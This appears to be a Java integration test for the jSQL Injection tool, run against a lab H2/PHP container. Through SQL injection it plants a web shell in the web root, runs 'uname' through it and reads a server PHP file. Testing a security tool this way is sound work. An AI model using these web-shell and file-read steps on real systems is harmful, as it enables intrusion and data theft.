package com.test.vendor.h2;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.JSqlException;
import com.jsql.view.terminal.SystemOutTerminal;
import org.apache.commons.lang3.StringUtils;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Assertions;
import org.junitpioneer.jupiter.RetryingTest;

import java.util.Collections;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ExecutionException;

public class H2ExploitSuiteIT extends ConcreteH2SuiteIT {
    
    @Override
    public void setupInjection() throws Exception {
        InjectionModel model = new InjectionModel();
        this.injectionModel = model;

        model.subscribe(new SystemOutTerminal());

        model.getMediatorUtils().getParameterUtil().initQueryString(
            "http://jsql-lamp:8079/php/pjbs-get-h2.php?lib="
        );
        
        model
        .getMediatorUtils()
        .getConnectionUtil()
        .withMethodInjection(model.getMediatorMethod().getQuery())
        .withTypeRequest("GET");
        
        model.beginInjection();
    }

    @RetryingTest(3)
    public void exploitWebAuto() {
        var urlSuccess = this.injectionModel.getResourceAccess().getExploitH2().createWeb("/var/www/html/", StringUtils.EMPTY);
        String resultCommand = this.injectionModel.getResourceAccess().runWebShell(
            "uname",
            UUID.randomUUID(),
            urlSuccess
        );
        LOGGER.info("web: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertEquals("Linux", resultCommand.trim());
    }

    @RetryingTest(3)
    public void readFile() throws JSqlException, ExecutionException, InterruptedException {
        List<String> contents = this.injectionModel.getResourceAccess().readFile(
            Collections.singletonList("/var/www/html/php/get-pdo.php")
        );
        LOGGER.info("ReadFile: found {}, to find {}", String.join(",", contents).trim(), "<?php");
        Assertions.assertTrue(String.join(",", contents).trim().contains("<?php"));
    }

    @AfterEach
    public void afterEach() {
        Assertions.assertEquals(
            this.injectionModel.getMediatorStrategy().getUnion(),
            this.injectionModel.getMediatorStrategy().getStrategy()
        );
    }
}
